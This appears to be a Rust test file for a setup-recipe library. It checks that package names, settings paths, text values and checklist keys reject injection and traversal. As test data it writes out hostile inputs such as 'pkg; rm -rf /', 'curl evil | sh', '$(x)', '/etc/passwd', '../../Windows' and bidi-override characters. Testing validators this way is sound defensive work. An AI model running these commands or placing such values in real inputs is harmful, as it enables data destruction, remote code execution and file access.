//! Setup recipes (engineering notes, building block 1): a closed set of typed steps, paths that
//! stay inside the app's settings, and the shared format rule.

use pctwin_recipe::{
    Arch, Catalog, Check, ChecklistKey, Os, Platform, Recipe, RecipeError, RecipeId, RelPath,
    SettingValue, SettingsPlace, SettingsRoot, Step,
};

fn win() -> Platform {
    Platform {
        os: Os::Windows,
        arch: Arch::X86_64,
    }
}

fn place(path: &str) -> SettingsPlace {
    SettingsPlace {
        root: SettingsRoot::Config,
        path: RelPath::new(path).unwrap(),
    }
}

fn firefox() -> Recipe {
    Recipe::new(
        RecipeId::new("org.mozilla.firefox").unwrap(),
        3,
        vec![win()],
        vec![
            Step::Install {
                catalog: Catalog::Winget,
                package: "Mozilla.Firefox".into(),
            },
            Step::CopySettings {
                from: place("Mozilla/Firefox/Profiles"),
                to: place("Mozilla/Firefox/Profiles"),
            },
            Step::ApplySetting {
                key: "browser.startup.page".into(),
                value: SettingValue::Int(3),
            },
            Step::Verify {
                check: Check::PackageInstalled {
                    catalog: Catalog::Winget,
                    package: "Mozilla.Firefox".into(),
                },
            },
        ],
    )
    .unwrap()
}

#[test]
fn a_recipe_round_trips_and_names_its_exact_version() {
    let r = firefox();
    let back = Recipe::from_json(&r.to_json()).unwrap();
    assert_eq!(back, r);
    assert_eq!(back.reference().version, 3);
    assert!(r.supports(win()));
    assert!(!r.supports(Platform {
        os: Os::Linux,
        arch: Arch::X86_64
    }));
}

#[test]
fn paths_cannot_leave_the_settings_folder() {
    for bad in [
        "",
        "/etc/passwd",
        "../x",
        "a/../../x",
        "a/./b",
        "a//b",
        "C:/x",
        "a\\b",
        "a/b\0",
        "x/\n",
    ] {
        assert!(RelPath::new(bad).is_err(), "{bad:?}");
    }
    assert!(RelPath::new("Mozilla/Firefox/profiles.ini").is_ok());
}

#[test]
fn ids_and_package_names_cannot_carry_addresses_or_commands() {
    for bad in ["", "Org.Bad", "a b", "../x", ".x", "a/b", "https://x"] {
        assert!(RecipeId::new(bad).is_err(), "{bad:?}");
    }
    for bad in [
        "https://evil.example/x.exe",
        "pkg; rm -rf /",
        "a b",
        "-flag",
        "$(x)",
        "a|b",
        "",
    ] {
        let r = Recipe::new(
            RecipeId::new("x").unwrap(),
            1,
            vec![win()],
            vec![
                Step::Install {
                    catalog: Catalog::Winget,
                    package: bad.into(),
                },
                Step::Verify {
                    check: Check::SettingsPresent { place: place("x") },
                },
            ],
        );
        assert!(matches!(r, Err(RecipeError::BadPackage(_))), "{bad:?}");
    }
}

#[test]
fn every_changing_step_carries_its_own_check() {
    let install = Step::Install {
        catalog: Catalog::Winget,
        package: "X".into(),
    };
    assert_eq!(
        install.check(),
        Some(Check::PackageInstalled {
            catalog: Catalog::Winget,
            package: "X".into()
        })
    );
    let copy = Step::CopySettings {
        from: place("a"),
        to: place("b"),
    };
    // A copy is checked by its contents, not by a file being there.
    assert_eq!(
        copy.check(),
        Some(Check::SettingsMatch {
            from: place("a"),
            to: place("b")
        })
    );
    let set = Step::ApplySetting {
        key: "k".into(),
        value: SettingValue::Bool(true),
    };
    assert_eq!(
        set.check(),
        Some(Check::SettingIs {
            key: "k".into(),
            value: SettingValue::Bool(true)
        })
    );
    // A recipe with no separate Verify step is fine: each change is checked on its own.
    assert!(Recipe::new(RecipeId::new("x").unwrap(), 1, vec![win()], vec![install]).is_ok());
}

/// Regression (fresh-context review of PR 20): a recipe made only of checks would report an app
/// rebuilt that nothing rebuilt.
#[test]
fn a_recipe_of_only_checks_is_refused() {
    let r = Recipe::new(
        RecipeId::new("x").unwrap(),
        1,
        vec![win()],
        vec![Step::Verify {
            check: Check::PackageInstalled {
                catalog: Catalog::Winget,
                package: "Already.There".into(),
            },
        }],
    );
    assert_eq!(r, Err(RecipeError::NothingToDo));
    // A recipe that only hands the person a checklist is fine.
    assert!(
        Recipe::new(
            RecipeId::new("x").unwrap(),
            1,
            vec![win()],
            vec![Step::Checklist {
                what: ChecklistKey::new("sign-in-to-the-app").unwrap()
            }],
        )
        .is_ok()
    );
}

/// Regression (fresh-context review of PR 20): text, keys, package names and paths that could
/// inject lines, read as flags or files, hide their direction, or open a device.
#[test]
fn hostile_text_keys_packages_and_paths_are_refused() {
    let one = |step: Step| Recipe::new(RecipeId::new("x").unwrap(), 1, vec![win()], vec![step]);
    for text in [
        "a\nproxy=evil",
        "a\r\nb",
        "nul\0",
        "abc\u{202E}txt.exe",
        "zero\u{200B}width",
        "\u{FEFF}bom",
    ] {
        assert_eq!(
            one(Step::ApplySetting {
                key: "k".into(),
                value: SettingValue::Text(text.into())
            }),
            Err(RecipeError::BadText),
            "{text:?}"
        );
    }
    for key in ["--help", "-rf", ".hidden"] {
        assert!(matches!(
            one(Step::ApplySetting {
                key: key.into(),
                value: SettingValue::Bool(true)
            }),
            Err(RecipeError::BadKey(_))
        ));
    }
    for package in [
        "foo.rpm",
        "foo.snap",
        "foo.rb",
        "setup.EXE",
        "x.msi",
        "app.flatpakref",
    ] {
        assert!(matches!(
            one(Step::Install {
                catalog: Catalog::Dnf,
                package: package.into()
            }),
            Err(RecipeError::BadPackage(_))
        ));
    }
    for path in [
        "nul",
        "a/NUL.txt",
        "con",
        "COM1",
        "lpt9.log",
        "COM\u{B9}",
        "a/b.",
        "a/b ",
        "...",
        "a\u{202E}b",
        "a\u{200B}b",
    ] {
        assert!(RelPath::new(path).is_err(), "{path:?}");
    }
    for fine in ["console.ini", "Company/Settings", "com10", "nullable.cfg"] {
        assert!(RelPath::new(fine).is_ok(), "{fine:?}");
    }
}

#[test]
fn empty_or_versionless_recipes_are_refused() {
    let id = || RecipeId::new("x").unwrap();
    let check = || {
        vec![Step::Checklist {
            what: ChecklistKey::new("x").unwrap(),
        }]
    };
    assert_eq!(
        Recipe::new(id(), 0, vec![win()], check()),
        Err(RecipeError::BadVersion)
    );
    assert_eq!(
        Recipe::new(id(), 1, vec![], check()),
        Err(RecipeError::NoPlatform)
    );
    assert_eq!(
        Recipe::new(id(), 1, vec![win()], vec![]),
        Err(RecipeError::BadStepCount)
    );
}

#[test]
fn saved_recipes_with_unknown_steps_or_fields_are_refused() {
    let json = String::from_utf8(firefox().to_json()).unwrap();
    let run = json.replace(
        r#"{"apply-setting""#,
        r#"{"run":{"command":"calc.exe"}},{"apply-setting""#,
    );
    assert!(Recipe::from_json(run.as_bytes()).is_err());
    let extra = json.replacen('{', r#"{"url":"https://x","#, 1);
    assert!(Recipe::from_json(extra.as_bytes()).is_err());
    let escape = json.replacen("Mozilla/Firefox/Profiles", "../../Windows", 1);
    assert!(matches!(
        Recipe::from_json(escape.as_bytes()),
        Err(RecipeError::Damaged(_))
    ));
}

#[test]
fn a_recipe_from_a_newer_pctwin_is_refused_safely() {
    let json = String::from_utf8(firefox().to_json()).unwrap();
    let newer = json.replacen(r#""format":1"#, r#""format":2,"new":"shape""#, 1);
    assert!(matches!(
        Recipe::from_json(newer.as_bytes()),
        Err(RecipeError::Format(
            pctwin_types::format::FormatError::Newer { found: 2, .. }
        ))
    ));
}

/// Regression (second fresh-context review of PR 20): characters that are invisible or change
/// direction are refused by Unicode property, not by a hand-picked list; the joiners real words
/// need stay allowed.
#[test]
fn hidden_characters_are_refused_by_property() {
    use pctwin_recipe::text_ok;
    for c in [
        '\u{061C}',
        '\u{2028}',
        '\u{2029}',
        '\u{E0041}',
        '\u{E007F}',
        '\u{00AD}',
        '\u{180E}',
        '\u{3164}',
        '\u{200B}',
        '\u{202E}',
        '\u{2066}',
        '\u{FEFF}',
        '\u{0600}',
        '\u{FFF9}',
        '\u{1D173}',
        '\u{115F}',
    ] {
        let text = format!("a{c}b");
        assert!(!text_ok(&text), "U+{:04X} passed", c as u32);
        assert!(
            RelPath::new(&text).is_err(),
            "U+{:04X} passed in a path",
            c as u32
        );
    }
    // Hindi and Persian spell with the joiners; emoji use variation selectors.
    for fine in [
        "\u{0915}\u{094D}\u{200D}\u{0937}",
        "\u{0645}\u{06CC}\u{200C}\u{062E}\u{0648}\u{0627}\u{0647}\u{0645}",
        "\u{2764}\u{FE0F}",
        "\u{1F469}\u{200D}\u{1F4BB}",
    ] {
        assert!(text_ok(fine), "{fine:?}");
        assert!(RelPath::new(fine).is_ok(), "{fine:?}");
    }
}

/// Regression (second fresh-context review of PR 20): a checklist entry is a message key, so a
/// recipe can never put a link or a command in front of the person.
#[test]
fn checklist_entries_are_message_keys_only() {
    for bad in [
        "https://evil.example",
        "curl evil | sh",
        "Sign in",
        "",
        "-x",
        "a\u{202E}b",
    ] {
        assert!(ChecklistKey::new(bad).is_err(), "{bad:?}");
    }
    assert!(ChecklistKey::new("activate-licence").is_ok());
    let json = r#"{"format":1,"id":"x","version":1,"platforms":[{"os":"windows","arch":"x86-64"}],"steps":[{"checklist":{"what":"curl evil | sh"}}]}"#;
    assert!(Recipe::from_json(json.as_bytes()).is_err());
}
